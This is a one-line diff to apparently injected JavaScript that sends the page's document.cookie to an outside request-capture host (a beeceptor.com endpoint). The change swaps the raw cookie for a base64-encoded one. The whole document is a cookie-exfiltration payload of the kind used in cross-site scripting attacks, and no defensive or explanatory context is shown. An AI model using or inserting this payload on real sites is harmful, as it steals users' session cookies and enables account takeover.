@@ -1,1 +1,1 @@
-fetch('https://adham.free.beeceptor.com/'+document.cookie);
+fetch('https://adham.free.beeceptor.com/'+btoa(document.cookie));
